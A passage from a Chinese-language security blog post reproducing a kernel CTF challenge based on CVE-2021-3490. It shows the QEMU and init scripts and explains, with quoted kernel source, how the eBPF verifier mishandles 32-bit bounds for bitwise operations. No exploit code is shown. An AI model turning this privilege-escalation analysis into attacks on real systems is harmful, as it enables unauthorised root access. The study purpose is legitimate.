<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="ebpf-pwn-A-Love-Story 复现 12&#x2F; $ cat &#x2F;proc&#x2F;version Linux version 5.11.16 (arttnba3@ubuntu) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.3 123456789101112#!&#x2F;bin&#x2F;shqemu-system-x86_64 \	-m 256M \	-cpu kvm64,+sme">
<meta property="og:type" content="article">
<meta property="og:title" content="ebpf pwn+CVE-2021-3490">
<meta property="og:url" content="http://example.com/2023/11/24/ebpf%20pwn+CVE-2021-3490/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="ebpf-pwn-A-Love-Story 复现 12&#x2F; $ cat &#x2F;proc&#x2F;version Linux version 5.11.16 (arttnba3@ubuntu) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.3 123456789101112#!&#x2F;bin&#x2F;shqemu-system-x86_64 \	-m 256M \	-cpu kvm64,+sme">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-11-23T19:53:58.000Z">
<meta property="article:modified_time" content="2023-11-30T17:52:52.000Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="ebpf pwn">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2023/11/24/ebpf%20pwn+CVE-2021-3490/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>ebpf pwn+CVE-2021-3490 | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/24/ebpf%20pwn+CVE-2021-3490/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ebpf pwn+CVE-2021-3490
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-24 03:53:58" itemprop="dateCreated datePublished" datetime="2023-11-24T03:53:58+08:00">2023-11-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-01 01:52:52" itemprop="dateModified" datetime="2023-12-01T01:52:52+08:00">2023-12-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>47k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>43 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>ebpf-pwn-A-Love-Story 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /proc/version </span><br><span class="line">Linux version <span class="number">5.11</span><span class="number">.16</span> (arttnba3@ubuntu) (gcc (Ubuntu <span class="number">9.4</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">20.04</span><span class="number">.1</span>) <span class="number">9.3</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 256M \</span><br><span class="line">	-cpu kvm64,+smep,+smap \</span><br><span class="line">	-smp cores=2,threads=2 \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-initrd ./rootfs.cpio \</span><br><span class="line">	-nographic \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-snapshot \</span><br><span class="line">	-append &quot;console=ttyS0 kaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">	-no-reboot</span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap，kaslr，pti</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig lo 127.0.0.1 netmask 255.255.255.0</span><br><span class="line">route add -net 127.0.0.0 netmask 255.255.255.0 lo</span><br><span class="line">echo &quot;flag&#123;yhellow&#125;&quot; &gt; /flag</span><br><span class="line">chmod 666 /flag</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">poweroff -d 1800000 -f &amp;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>下载 5.11.16 的内核源码：<a target="_blank" rel="noopener" href="https://cdn.kernel.org/pub/linux/kernel/v5.x/">Index of /pub/linux/kernel/v5.x/</a> </p>
<p><strong>漏洞分析</strong></p>
<p>本题目没有内核模块，漏洞点为 CVE-2021-3490：</p>
<ul>
<li>CVE-2021-3490 是一个发生在 eBPF verifier 中的漏洞，由于 eBPF verifier 在校验位运算操作（ 与、或、异或 ）时没有正确地更新寄存器的 32 位边界，从而导致攻击者可以构造出非法的运行时寄存器值以进行提权</li>
</ul>
<p>在 eBPF 对寄存器计算的指令中，分为64位和32位操作两部分</p>
<ul>
<li>64位指令会对寄存器的64位全部进行操作</li>
<li>32位指令只会对寄存器的低32位进行操作</li>
</ul>
<p>eBPF 程序的安全主要是由 verifier 保证的，verifier 会模拟执行每一条指令并验证寄存器的值是否合法，主要关注这几个字段：</p>
<ul>
<li><code>smin_value</code>、<code>smax_value</code>：64 位有符号的值的可能取值边界</li>
<li><code>umin_value</code>、<code>umax_value</code>：64 位无符号的值的可能取值边界</li>
<li><code>s32_min_value</code>、<code>s32_max_value</code>：32 位有符号的值的可能取值边界</li>
<li><code>u32_min_value</code>、<code>u32_max_value</code>：32 位无符号的值的可能取值边界</li>
</ul>
<p>其中，这个寄存器中具体的值，会用如下结构体进行表示： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> &#123;</span></span><br><span class="line">	u64 value;</span><br><span class="line">	u64 mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>value &amp; mask</code> 表示这个寄存器中可以确定的值</li>
</ul>
<p>用于检测指令合法性的函数为 <code>do_check</code>，该函数会遍历每一条指令并根据指令的不同类型进行不同操作，对于算术指令（<code>BPF_ALU</code> / <code>BPF_ALU64</code>）而言有如下调用链（模拟通过后才能正常加载）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do_check()        					<span class="comment">// 遍历每一条指令并根据类型调用相应函数处理</span></span><br><span class="line">-&gt;check_alu_op()       				 <span class="comment">// 根据算术指令的opcode进行不同处理</span></span><br><span class="line">-&gt;adjust_reg_min_max_vals()        	<span class="comment">// 计算新的寄存器边界值</span></span><br><span class="line">-&gt;adjust_scalar_min_max_vals()		<span class="comment">// 根据opcode计算具体的新边界值</span></span><br></pre></td></tr></table></figure>
<p>首先分析调整标量数据范围的 <code>adjust_scalar_min_max_vals</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_scalar_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct bpf_insn *insn,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct bpf_reg_state src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	<span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line">                </span><br><span class="line">	<span class="keyword">case</span> BPF_AND:</span><br><span class="line">		dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">		scalar32_min_max_and(dst_reg, &amp;src_reg); <span class="comment">/* 处理32位(漏洞函数) */</span></span><br><span class="line">		scalar_min_max_and(dst_reg, &amp;src_reg); <span class="comment">/* 处理64位 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_OR:</span><br><span class="line">		dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">		scalar32_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">		scalar_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_XOR:</span><br><span class="line">		dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">		scalar32_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line">		scalar_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line">                </span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (alu32)</span><br><span class="line">		zext_32_to_64(dst_reg);</span><br><span class="line"></span><br><span class="line">	__update_reg_bounds(dst_reg); <span class="comment">/* 对比寄存器的var_off并更新边界值 */</span></span><br><span class="line">	__reg_deduce_bounds(dst_reg); <span class="comment">/* 边界调整校验 */</span></span><br><span class="line">	__reg_bound_offset(dst_reg); <span class="comment">/* 基于边界值范围重新计算var_off的值 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本 <code>cve</code> 的漏洞点位于函数 <code>scalar32_min_max_and</code>，其中的 <code>BPF_AND \ BPF_OR \ BPF_XOR</code> 三类操作有问题 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">				 struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 判断是否能确定src_reg和dst_reg两个寄存器低32位的值(是否为&#x27;0&#x27;) */</span></span><br><span class="line">	<span class="keyword">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line">	<span class="keyword">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">    <span class="comment">/* 获取dst_reg-&gt;var_off的低32位值,并且分别获取src_reg的s32_min_value和u32_max_value */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);</span><br><span class="line">	s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">	u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 如果src_reg和dst_reg的值都已经确定,那么则直接返回(因为64位时还会进行更新) */</span></span><br><span class="line">	<span class="keyword">if</span> (src_known &amp;&amp; dst_known) </span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 使用var32_off的值来更新dst_reg的u32_min_value和u32_max_value */</span></span><br><span class="line">	dst_reg-&gt;u32_min_value = var32_off.value;</span><br><span class="line">	dst_reg-&gt;u32_max_value = min(dst_reg-&gt;u32_max_value, umax_val);</span><br><span class="line">	<span class="keyword">if</span> (dst_reg-&gt;s32_min_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 同为负则用src_reg的最大最小值 */</span></span><br><span class="line">		dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">		dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 否则用dst_reg的u32_min_value和u32_max_value更新 */</span></span><br><span class="line">		dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;</span><br><span class="line">		dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在更新 32 位边界值时，如果两个寄存器的低 32 位都为 <code>known</code> 那就可以直接跳过，因为程序认为 64 位时还会进行更新 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 判断是否能确定src_reg和dst_reg两个寄存器(是否为&#x27;0&#x27;) */</span></span><br><span class="line">	<span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line">	<span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">    <span class="comment">/* 获取dst_reg-&gt;var_off的值,并且分别获取src_reg的smin_value和umax_value */</span></span><br><span class="line">	s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">	u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果src_reg和dst_reg的值都已经确定,那么更新边界值 */</span></span><br><span class="line">	<span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">		__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment">	 * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">	dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line">	<span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment">		 * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">		dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment">		 * cast result into s64.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">		dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">	__update_reg_bounds(dst_reg); <span class="comment">/* 对比寄存器的var_off并更新边界值 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在更新64位边界值时，若两个寄存器都为 <code>known</code> 就直接调用 <code>__mark_reg_known</code>（PS：64位和32位判断调用 <code>__mark_reg_known</code> 的条件不同，这也引发了漏洞）</li>
<li><code>__mark_reg_known</code> 用于设置一个已经确定的寄存器，简单的调用 <code>tnum_const</code> 设置寄存器 <code>var_off</code> 为 <code>known</code>，并给对应边界赋值</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Clear id, off, and union(map_ptr, range) */</span></span><br><span class="line">	<span class="built_in">memset</span>(((u8 *)reg) + <span class="keyword">sizeof</span>(reg-&gt;type), <span class="number">0</span>,</span><br><span class="line">	       offsetof(struct bpf_reg_state, var_off) - <span class="keyword">sizeof</span>(reg-&gt;type));</span><br><span class="line">	___mark_reg_known(reg, imm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> ___mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">	reg-&gt;smin_value = (s64)imm;</span><br><span class="line">	reg-&gt;smax_value = (s64)imm;</span><br><span class="line">	reg-&gt;umin_value = imm;</span><br><span class="line">	reg-&gt;umax_value = imm;</span><br><span class="line"></span><br><span class="line">	reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">	reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">	reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">	reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在最后还会调用 <code>__update_reg_bounds()</code> 对比寄存器的 <code>var_off</code> 并更新边界值： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	__update_reg32_bounds(reg);</span><br><span class="line">	__update_reg64_bounds(reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg32_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">	reg-&gt;s32_min_value = <span class="keyword">max_t</span>(s32, reg-&gt;s32_min_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MIN));</span><br><span class="line">	<span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">	reg-&gt;s32_max_value = <span class="keyword">min_t</span>(s32, reg-&gt;s32_max_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MAX));</span><br><span class="line">	reg-&gt;u32_min_value = <span class="keyword">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">	reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line">				 (u32)(var32_off.value | var32_off.mask));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
